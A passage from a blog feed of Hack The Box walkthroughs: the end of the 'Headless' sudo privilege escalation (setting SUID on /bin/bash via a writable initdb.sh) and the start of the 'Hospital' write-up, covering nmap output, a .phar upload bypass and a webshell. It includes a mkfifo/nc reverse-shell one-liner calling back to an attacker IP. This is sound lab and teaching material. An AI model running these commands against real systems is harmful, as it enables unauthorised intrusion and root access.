/usr/bin/echo <span class="s2">"System load average: </span><span class="nv">$load_average</span><span class="s2">"</span>

<span class="c"># Absolute path used here</span>
<span class="nv">initdb_script</span><span class="o">=</span><span class="s2">"/opt/scripts/initdb.sh"</span>

<span class="k">if</span> <span class="o">!</span> /usr/bin/pgrep <span class="nt">-x</span> <span class="s2">"initdb.sh"</span> &amp;&gt;/dev/null<span class="p">;</span> <span class="k">then
  if</span> <span class="o">[</span> <span class="nt">-x</span> <span class="s2">"</span><span class="nv">$initdb_script</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
    <span class="nv">$initdb_script</span> 2&gt;/dev/null
    /usr/bin/echo <span class="s2">"Database service started."</span>
  <span class="k">else</span>
    /usr/bin/echo <span class="s2">"Error: initdb.sh script not found or not executable."</span>
  <span class="k">fi
else</span>
  /usr/bin/echo <span class="s2">"Database service is running."</span>
<span class="k">fi</span>
</code></pre></div></div> <ol> <li><strong>Absolute Path Definition</strong>: The path to <code class="language-plaintext highlighter-rouge">initdb.sh</code> is set as an absolute path (<code class="language-plaintext highlighter-rouge">/opt/scripts/initdb.sh</code>). This ensures that the script always attempts to execute the specific <code class="language-plaintext highlighter-rouge">initdb.sh</code> located in <code class="language-plaintext highlighter-rouge">/opt/scripts</code>, regardless of the current working directory.</li> <li><strong>Check for Script Existence and Executability</strong>: Before attempting to execute <code class="language-plaintext highlighter-rouge">initdb.sh</code>, the script checks if the file exists and is executable (<code class="language-plaintext highlighter-rouge">-x</code>). This adds an additional layer of safety by ensuring that the script does not attempt to execute a non-existent or non-executable file, which could result in errors or security issues.</li> <li><strong>Clear Error Messaging</strong>: In case the <code class="language-plaintext highlighter-rouge">initdb.sh</code> script is not found or is not executable, the script clearly prints an error message. This helps in troubleshooting and ensures that script failures due to path issues are communicated clearly to the user or administrator.</li> </ol> <p>Using absolute paths like this not only mitigates the risk of unintended file execution but also enhances the script’s robustness by making its operation more predictable and secure.</p> <h1 id="privilege-escalation">Privilege escalation</h1> <p>Creating the <code class="language-plaintext highlighter-rouge">initdb.sh</code> file to execute <code class="language-plaintext highlighter-rouge">/bin/bash</code> results in the shell elevated to root privileges.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"chmod u+s /bin/bash"</span> <span class="o">&gt;</span> initdb.sh
<span class="nv">$ </span><span class="nb">chmod</span> +x initdb.sh
<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 2.0G
System load average:  0.06, 0.03, 0.00
Database service is not running. Starting it...
<span class="nv">$ </span>/bin/bash <span class="nt">-p</span>
<span class="nb">whoami
</span>root
<span class="nb">cat</span> /root/root.txt
f894b8ca49729b&lt;SNIP&gt;
</code></pre></div></div> <p><strong><code class="language-plaintext highlighter-rouge">echo "chmod u+s /bin/bash" &gt; initdb.sh</code></strong></p> <ul> <li>This writes a command into a script file (<code class="language-plaintext highlighter-rouge">initdb.sh</code>) that, when executed, will set the SUID bit on <code class="language-plaintext highlighter-rouge">/bin/bash</code>. Setting the SUID bit (<code class="language-plaintext highlighter-rouge">u+s</code>) on <code class="language-plaintext highlighter-rouge">/bin/bash</code> will allow any user to run Bash as the root user. As the <code class="language-plaintext highlighter-rouge">/usr/bin/syscheck</code> binary can be ran in the context of <code class="language-plaintext highlighter-rouge">sudo</code>, calling <code class="language-plaintext highlighter-rouge">initdb.sh</code> via this binary , means the encapsulated command will also be ran as <code class="language-plaintext highlighter-rouge">sudo</code>, and <code class="language-plaintext highlighter-rouge">/bin/bash</code> will have its SUID successfully modified.</li> </ul> <p><strong><code class="language-plaintext highlighter-rouge">chmod +x initdb.sh</code></strong></p> <ul> <li>Makes the <code class="language-plaintext highlighter-rouge">initdb.sh</code> script executable.</li> </ul> <p><strong><code class="language-plaintext highlighter-rouge">sudo /usr/bin/syscheck</code></strong></p> <ul> <li>Runs the binary the user has sudo rights over, which ends with the malicious <code class="language-plaintext highlighter-rouge">initdb.sh</code> script being called.</li> </ul> <p><strong><code class="language-plaintext highlighter-rouge">/bin/bash -p</code></strong></p> <ul> <li>Launches a new Bash shell with the SUID bit set (<code class="language-plaintext highlighter-rouge">-p</code>), running with root privileges because of the earlier <code class="language-plaintext highlighter-rouge">chmod u+s /bin/bash</code>.</li> </ul>]]></content><author><name></name></author><category term="HTB-Machines"/><category term="easy-box"/><category term="HTB"/><category term="XSS"/><category term="Reflected-XSS"/><category term="Cross-Site-Scripting"/><category term="cookies"/><category term="cookie-manipulation"/><category term="session-hijacking"/><category term="command-injection"/><category term="sudo-misconfiguration"/><category term="relative-paths"/><category term="secure-coding"/><summary type="html"><![CDATA[Headless - Hack The Box walkthrough.]]></summary></entry><entry><title type="html">Hospital - Insecure File Uploads, Business Email Compromise, and kernel exploits.</title><link href="https://emdeh.github.io/blog/2024/hospital-walkthrough/" rel="alternate" type="text/html" title="Hospital - Insecure File Uploads, Business Email Compromise, and kernel exploits."/><published>2024-04-08T14:14:00+00:00</published><updated>2024-04-08T14:14:00+00:00</updated><id>https://emdeh.github.io/blog/2024/hospital-walkthrough</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/hospital-walkthrough/"><![CDATA[<h1 id="introduction">Introduction</h1> <p>Hospital is rated as a medium difficulty Windows machine. The kill chain was extensive. After registering a fraudulent account on a web frontend, an Insecure File Upload vulnerability that exploited to upload a malicious filetype, leading to initial access on a Linux webserver.</p> <p>An unpatched vulnerability in the Linux kernel was then exploited elevate privileges and steal hashes. Cracking the hashes led to unauthorised access of a business email account. The use of unpatched software was then exploited to breakout of the Linux webserver and obtain a shell on a Windows machine.</p> <p>From there, insecure coding practices had hardcoded a password in a batch script. The presence of a local administrator account and inappropriate file permissions resulted in obtaining <code class="language-plaintext highlighter-rouge">NT Authority</code> system access.</p> <p>The machine clearly demonstrates how various vulnerabilities can be chained together to ultimately become greater than the sum of their parts.</p> <hr/> <h2 id="vulnerabilities-explored">Vulnerabilities explored</h2> <h4 id="insecure-file-upload">Insecure File Upload</h4> <p>Allows attackers to upload malicious files to a server, which can lead to unauthorised access or code execution. Mitigation involves strict validation of file types, sizes, and content, alongside implementing secure upload directories.</p> <h4 id="weak-credentials">Weak credentials</h4> <p>Use of easily guessed or default credentials, making unauthorised access simpler. Mitigation includes enforcing strong password policies and educating users about secure password practices.</p> <h4 id="unpatched-operating-systems">Unpatched Operating systems</h4> <p>Exploits known vulnerabilities in outdated operating systems; in this case, the Linux kernel. Regularly updating and patching operating systems and software mitigates this.</p> <h4 id="command-injections">Command injections</h4> <p>Occurs when an application passes unsafe user-supplied data to a system shell. Mitigation involves validating and sanitising all user inputs and using secure coding practices to avoid execution of untrusted commands.</p> <h4 id="remote-code-execution">Remote code execution</h4> <p>Allows an attacker to execute arbitrary code on a victim’s system. Mitigation strategies include keeping software up to date, employing least privilege principles, and using firewalls and intrusion detection/prevention systems.</p> <h4 id="insecure-coding">Insecure coding</h4> <p>Vulnerabilities introduced by errors or poor practices in software development. Mitigation involves using secure coding practices, regular code reviews, and automated security scanning.</p> <p>Improperly configured file or directory permissions that give unauthorised access. Regular audits and correctly setting permissions based on the principle of least privilege and separation of duties can mitigate this.</p> <h4 id="local-administrator-accounts">Local administrator accounts</h4> <p>Local accounts with high privileges not being properly managed or disabled. Best practices include disabling unnecessary accounts and using centralised authentication methods like Active Directory and LAPS.</p> <h2 id="tools">Tools</h2> <ul> <li><a href="https://github.com/nmap/nmap">Nmap</a></li> <li>Dirsearch</li> <li>Burpsuite</li> <li><a href="https://github.com/flozz/p0wny-shell/tree/master">PHP WebShell</a></li> <li><a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629">Linux Kernel exploit for initial privilege escalation</a></li> <li>Hashcat for password cracking</li> <li><a href="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection">CVE-2023-36664 exploit for command injection</a></li> <li>Evil-winrm</li> </ul> <h2 id="tactics-and-methods">Tactics and Methods</h2> <h4 id="exploiting-insecure-code">Exploiting insecure code</h4> <ul> <li><strong>File Upload</strong>: Utilised to upload a <code class="language-plaintext highlighter-rouge">.phar</code> file, exploiting insecure file upload handling.</li> <li><strong>Hardcoded Password</strong>: Identified in a batch script, demonstrating insecure coding practices.</li> </ul> <h4 id="stealing-hashes-and-exploiting-weak-credentials">Stealing hashes and exploiting weak credentials</h4> <ul> <li><strong>Hash Stealing</strong>: Stole system hashes from the <code class="language-plaintext highlighter-rouge">/etc/shadow</code> file.</li> <li><strong>Weak credentials:</strong> Cracking them to revealed weak credentials.</li> </ul> <h4 id="business-email-compromise">Business email compromise</h4> <ul> <li><strong>Email Compromise</strong>: Achieved by exploiting weak credentials to access Dr. Williams’ email, illustrating the danger of weak passwords and the effectiveness of password cracking.</li> </ul> <h4 id="exploiting-unpatched-vulnerabilities">Exploiting unpatched vulnerabilities</h4> <ul> <li><strong>Linux Kernel Exploit (CVE-2023-2640-CVE-2023-32629)</strong>: Leveraged to gain elevated privileges through an unpatched kernel vulnerability.</li> <li><strong>Command Injection (CVE-2023-36664)</strong>: Used to inject and execute malicious commands in GhostScript, demonstrating the risk of unpatched software.</li> </ul> <h4 id="establishing-persistence">Establishing persistence</h4> <ul> <li><strong>Malicious SSH Keys</strong>: Added to ensure persistent access, highlighting the importance of securing authentication mechanisms.</li> </ul> <h4 id="exploiting-folder-permissions-and-local-administrator-account">Exploiting folder permissions and local administrator account</h4> <ul> <li><strong>Inappropriate Permissions</strong>: Exploited to achieve <code class="language-plaintext highlighter-rouge">NT Authority</code> system access, underscoring the need for proper file and directory permission settings.</li> <li><strong>Local Admin Account</strong>: Utilised to grab the root flag to demonstrate access, showcasing the risks associated with not disabling unnecessary administrator accounts.</li> </ul> <h1 id="enumeration">Enumeration</h1> <h2 id="nmap-scanning">Nmap scanning</h2> <p>As always, we begin with an nmap scan.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-A</span> <span class="nt">-v</span> 10.129.8.141 | <span class="nb">tee </span>nmap-output.txt   
</code></pre></div></div> <p><strong><em>A note on <code class="language-plaintext highlighter-rouge">-A</code></em></strong></p> <ul> <li><em><code class="language-plaintext highlighter-rouge">-A</code> is a comprehensive scan. It stands for “aggressive scan” and combines several advanced scanning features in one command. Specifically, it enables OS detection (<code class="language-plaintext highlighter-rouge">-O</code>), version detection (<code class="language-plaintext highlighter-rouge">-sV</code>), script scanning (<code class="language-plaintext highlighter-rouge">-sC</code>), and traceroute (<code class="language-plaintext highlighter-rouge">--traceroute</code>).</em></li> <li><em>When you use <code class="language-plaintext highlighter-rouge">-A</code>, <code class="language-plaintext highlighter-rouge">nmap</code> not only performs a script scan with the default scripts (as <code class="language-plaintext highlighter-rouge">-sC</code> does) but also tries to identify the operating system of the target, determine service/version information more aggressively, and maps out the path packets take to the host.</em></li> <li><em>Using <code class="language-plaintext highlighter-rouge">-A</code> is a good choice when you want a comprehensive overview of the target, but it’s more intrusive and might be detected more easily by intrusion detection systems (IDS) than using <code class="language-plaintext highlighter-rouge">-sC</code> alone. Always ensure you have authorization to perform such scans on the network you’re investigating.</em> &lt;/small&gt;</li> </ul> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-19 04:09 EDT
NSE: Loaded 156 scripts <span class="k">for </span>scanning.
NSE: Script Pre-scanning.
Initiating NSE at 04:09
Completed NSE at 04:09, 0.00s elapsed
Initiating NSE at 04:09
Completed NSE at 04:09, 0.00s elapsed
Initiating NSE at 04:09
Completed NSE at 04:09, 0.00s elapsed
Initiating Ping Scan at 04:09
Scanning 10.129.82.144 <span class="o">[</span>2 ports]
Completed Ping Scan at 04:09, 0.32s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
Initiating Parallel DNS resolution of 1 host. at 04:09
Completed Parallel DNS resolution of 1 host. at 04:09, 0.00s elapsed
Initiating Connect Scan at 04:09
Scanning 10.129.82.144 <span class="o">[</span>1000 ports]
Discovered open port 3389/tcp on 10.129.82.144
Discovered open port 22/tcp on 10.129.82.144
Discovered open port 139/tcp on 10.129.82.144
Discovered open port 445/tcp on 10.129.82.144
Discovered open port 8080/tcp on 10.129.82.144
Discovered open port 135/tcp on 10.129.82.144
Discovered open port 443/tcp on 10.129.82.144
Discovered open port 53/tcp on 10.129.82.144
Discovered open port 3269/tcp on 10.129.82.144
Discovered open port 593/tcp on 10.129.82.144
Discovered open port 88/tcp on 10.129.82.144
Discovered open port 464/tcp on 10.129.82.144
Discovered open port 2107/tcp on 10.129.82.144
Discovered open port 2103/tcp on 10.129.82.144
Discovered open port 3268/tcp on 10.129.82.144
Discovered open port 389/tcp on 10.129.82.144
Discovered open port 636/tcp on 10.129.82.144
Discovered open port 1801/tcp on 10.129.82.144
Discovered open port 2179/tcp on 10.129.82.144
Discovered open port 2105/tcp on 10.129.82.144
Completed Connect Scan at 04:10, 31.97s elapsed <span class="o">(</span>1000 total ports<span class="o">)</span>
Initiating Service scan at 04:10
Scanning 20 services on 10.129.82.144
Completed Service scan at 04:11, 64.47s elapsed <span class="o">(</span>20 services on 1 host<span class="o">)</span>
NSE: Script scanning 10.129.82.144.
Initiating NSE at 04:11
Completed NSE at 04:12, 42.19s elapsed
Initiating NSE at 04:12
Completed NSE at 04:12, 5.80s elapsed
Initiating NSE at 04:12
Completed NSE at 04:12, 0.00s elapsed
Nmap scan report <span class="k">for </span>10.129.82.144
Host is up <span class="o">(</span>0.32s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 980 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca <span class="o">(</span>ED25519<span class="o">)</span>
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-03-19 15:10:36Z<span class="o">)</span>
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: hospital.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: <span class="nv">commonName</span><span class="o">=</span>DC
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
443/tcp  open  ssl/http          Apache httpd 2.4.56 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28<span class="o">)</span>
| tls-alpn:
|_  http/1.1
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost
| Issuer: <span class="nv">commonName</span><span class="o">=</span>localhost
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
|_http-favicon: Unknown favicon MD5: 924A68D347C80D0E502157E83812BB23
|_http-server-header: Apache/2.4.56 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: <span class="nv">commonName</span><span class="o">=</span>DC
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: hospital.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: <span class="nv">commonName</span><span class="o">=</span>DC
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: <span class="nv">commonName</span><span class="o">=</span>DC
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC.hospital.htb
| Issuer: <span class="nv">commonName</span><span class="o">=</span>DC.hospital.htb
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-03-18T15:06:28
| Not valid after:  2024-09-17T15:06:28
| MD5:   f596:b381:3127:b856:8368:11d2:c493:ebad
|_SHA-1: 9445:fdff:334c:4ad8:2560:bdcc:4665:a871:ec50:4d6b
| rdp-ntlm-info:
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2024-03-19T15:11:35+00:00
8080/tcp open  http              Apache httpd 2.4.55 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.55 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-open-proxy: Proxy might be redirecting requests
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not <span class="nb">set</span>
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Login
|_Requested resource was login.php
Service Info: Host: DC<span class="p">;</span> OSs: Linux, Windows<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m57s, deviation: 0s, median: 6h59m57s
| smb2-time:
|   <span class="nb">date</span>: 2024-03-19T15:11:35
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

NSE: Script Post-scanning.
Initiating NSE at 04:12
Completed NSE at 04:12, 0.00s elapsed
Initiating NSE at 04:12
Completed NSE at 04:12, 0.00s elapsed
Initiating NSE at 04:12
Completed NSE at 04:12, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>145.01 seconds

</code></pre></div></div> <h3 id="findings">Findings</h3> <p>The scan returned an extensive list of possibilities. At first glance items of interest are:</p> <ol> <li> <p><strong>Mixed Operating Systems</strong>: The service information suggests a mixture of Linux and Windows operating systems. This is indicated by the presence of OpenSSH running on Ubuntu and various Microsoft services such as Active Directory LDAP, Windows RPC, and Terminal Services. This could the use of a Windows Subsystem for Linux.</p> </li> <li> <p><strong>Domain and Active Directory Services</strong>: The presence of services such as LDAP (ports 389, 636, 3268, 3269) with references to a domain (<code class="language-plaintext highlighter-rouge">hospital.htb</code>), Microsoft Windows Active Directory, and Kerberos (port 88) suggest that the target is functioning as a domain controller within a Windows Active Directory environment. This could provide avenues for exploiting attack vectors relating to domain-level vulnerabilities or misconfigurations.</p> </li> <li> <p><strong>Web Services</strong>: Ports 443 and 8080 are running web services (Apache httpd) with SSL, where port 443’s service is identified as a webmail system for “Hospital Webmail”. The presence of a login page on port 8080 (<code class="language-plaintext highlighter-rouge">login.php</code>) suggests a potential target for web-based attacks, such as SQL injection, brute-force login, or exploiting web application vulnerabilities.</p> </li> <li> <p><strong>Potential Entry Points</strong>: The open ports 22 (SSH) and 3389 (RDP) are traditional entry points for accessing a system. The reported versions may be worth exploring for known vulnerabilities as a means to gain initial access. More likely, however, is they could be used after stealing credentials from elsewhere.</p> </li> <li> <p><strong>Service Versions and Vulnerabilities</strong>: The version information for several services, such as OpenSSH 9.0p1 on Ubuntu and Apache httpd 2.4.56 on Windows is worth checking for known vulnerabilities.</p> </li> <li> <p><strong>Network Service Protocols</strong>: The open ports associated with Microsoft-specific services (e.g., netbios-ssn on port 139, microsoft-ds on 445, ncacn_http on 593) hint at possible SMB or RPC vulnerabilities that could be exploited for lateral movement or privilege escalation within the network.</p> </li> </ol> <h2 id="domain-enumeration">Domain enumeration</h2> <p>Next, the domain is enumerated. First we add it to the hosts file to make it accessible.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"10.129.82.144 hospital.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
</code></pre></div></div> <p>Navigating to Port <code class="language-plaintext highlighter-rouge">8080</code> reveals a logon page, and a link to register an account.</p> <p><img src="/assets/img/2024-hospital/landing-page.png" alt="landing-page.png" class="auto-resize"/></p> <p>There is no validation on account registration, so a fraudulent account is created. <img src="/assets/img/2024-hospital/registration-page.png" alt="registration-page.png" class="auto-resize"/></p> <p>Logging in with the account, and a page is presented to upload medical records, suggesting the presence of a file upload vulnerability.</p> <p><img src="/assets/img/2024-hospital/file-upload-page.png" alt="file-upload-page.png" class="auto-resize"/></p> <h1 id="file-upload-enumeration">File upload enumeration</h1> <p>To begin, a test.jpg file is created and the results monitored in Burpsuite.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb-machines/hospital/exploits]
└─<span class="nv">$ </span><span class="nb">touch </span>test.jpg <span class="o">&amp;&amp;</span> <span class="nb">echo test</span> <span class="o">&gt;</span> test.jpg
</code></pre></div></div> <p>Burpsuite confirms the file was uploaded successfully.</p> <p><img src="/assets/img/2024-hospital/jpg-file-upload success.png" alt="jpg-file-upload success.png" class="auto-resize"/></p> <p>Given the backend appears to be <code class="language-plaintext highlighter-rouge">PHP</code>, a <code class="language-plaintext highlighter-rouge">PHP</code> file is tried next.</p> <p><img src="/assets/img/2024-hospital/php-file-test.png" alt="php-file-test.png" class="auto-resize"/></p> <p>It appears <code class="language-plaintext highlighter-rouge">PHP</code> files are disallowed. In this instance, a <code class="language-plaintext highlighter-rouge">PHAR</code> file can be tried.</p> <blockquote> <p><small> <em>A PHAR (PHP Archive) file is a packaging format for PHP applications, enabling entire PHP applications, including their supporting files, to be distributed and executed as a single archive file. Introduced in PHP 5.3, PHAR files are conceptually similar to Java’s JAR files, providing a way to distribute and deploy PHP applications easily.</em></small></p> <p><em>PHAR files can contain PHP code, HTML, images, and other resources needed by the application. They are designed to simplify deployment: instead of dealing with many files and directories, you only need to manage one PHAR file. This makes it easier to distribute, install, and update complex PHP applications.</em> &lt;/small&gt;</p> </blockquote> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/Documents/htb-machines/hospital/exploits]
└─$ touch test.phar &amp;&amp; echo test &gt; test.phar
</code></pre></div></div> <p><img src="/assets/img/2024-hospital/phar-file-test.png" alt="phar-file-test.png" class="auto-resize"/></p> <p><strong><em>A note of .phar files</em></strong></p> <ul> <li>The <code class="language-plaintext highlighter-rouge">PHAR</code> file works, indicating an Insecure File Upload vulnerability due to insecure coding where the potentially malicious file extension has not been disallowed.</li> <li>To exploit this, a <code class="language-plaintext highlighter-rouge">phar</code> based shell can be crafted and uploaded. Navigating to the file will execute the payload. So understanding where the files upload to is required.</li> <li>Browsing to the <code class="language-plaintext highlighter-rouge">/uploads</code> directory seems to indicate that location does not exist. Further directory enumeration is required to validate how the file upload vulnerability can be successfully exploited.</li> </ul> <p><img src="/assets/img/2024-hospital/uploads-404.png" alt="uploads-404.png" class="auto-resize"/></p> <h2 id="directory-enumeration">Directory enumeration</h2> <p>Dirsearch can be used to enumerate the directories.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(kali㉿kali)-[~/Documents/htb-machines/hospital/scans]
└─$ dirsearch -u http://hospital.htb:8080
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Documents/htb-machines/hospital/scans/reports/http_hospital.htb/_24-04-07_20-12-41.txt

Target: http://hospital.htb/

[20:12:41] Starting:

</code></pre></div></div> <p>The results differ from browser, showing a <strong>301 Moved Permanently</strong> and a <strong>403 forbidden</strong> status codes for `http://hospital.htb:8080/uploads/.</p> <p><img src="/assets/img/2024-hospital/uploads-redirect.png" alt="uploads-redirect.png" class="auto-resize"/></p> <h1 id="exploitation">Exploitation</h1> <p>Given the uploads folder is not directly accessible, trying to access the file directly rather than traversing the folder structure may work.</p> <p>Uploading a shell with a <code class="language-plaintext highlighter-rouge">.phar</code> extension appears to work briefly, with the shell caught for a moment, but then dropped. Browsing to the malicious file, an error message appears.</p> <p><img src="/assets/img/2024-hospital/dropped-shell.png" alt="dropped-shell.png" class="auto-resize"/></p> <p>Attempting a webshell is more successful, but command results are not returned and the attempts begin to return a 404 status code, indicating the file is no longer present.</p> <p><img src="/assets/img/2024-hospital/web-shell-fail.png" alt="web-shell-fail.png" class="auto-resize"/></p> <p>Trying the initial shell again now also returns a 404 code, which may indicate some sort of time-based file process mechanism.</p> <p><img src="/assets/img/2024-hospital/404-rev-shell.png" alt="404-rev-shell.png" class="auto-resize"/></p> <p>Returning tot he webshell responses, and attempting to redirecting them by forwarding it back to the terminal also fails.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.2 4321 &gt;/tmp/f
</code></pre></div></div> <p>Trying the command encoded in base-64 and url-encoding also fails. This indicates the problem is likely with the websehll itself.</p> <p>Trying a new shell from <a href="https://github.com/flozz/p0wny-shell/tree/master">flozz</a> is successful and a working webshell is obtained.</p> <p><img src="/assets/img/2024-hospital/webshell-success.png" alt="webshell-success.png" class="auto-resize"/></p> <p>Forwarding it back to the terminal is also successful.</p> <p><img src="/assets/img/2024-hospital/forward-webshell.png" alt="forward-webshell.png" class="auto-resize"/></p> <p>To stabilise the shell we can use the following command combination.</p> <p><img src="/assets/img/2024-hospital/stabilise-shell.png" alt="stabilise-shell.png" class="auto-resize"/></p> <ul> <li><strong><code class="language-plaintext highlighter-rouge">python3 -c 'import pty;pty.spawn("/bin/bash")'</code></strong>: <ul> <li>Launches a new Bash shell within a pseudo-terminal (PTY) session.</li> <li>Improves interaction with the shell (e.g., supports auto-completion, history).</li> <li>Makes the shell behave more like a local terminal.</li> </ul> </li> <li><strong><code class="language-plaintext highlighter-rouge">export TERM=xterm</code></strong>: <ul> <li>Sets the terminal type to <code class="language-plaintext highlighter-rouge">xterm</code>, which is widely compatible and supports advanced features.</li> <li>Ensures that the terminal emulation behaves consistently.</li> <li>Enables colour support, cursor movement, and screen clearing commands.</li> </ul> </li> <li><strong><code class="language-plaintext highlighter-rouge">stty raw -echo</code></strong>: <ul> <li>Sets the terminal to raw mode, sending characters directly without processing.</li> <li>Disables local echo, preventing typed characters from being displayed twice.</li> <li>Ensures that input and output are sent and received as intended, without automatic newline handling or echoing.</li> </ul> </li> 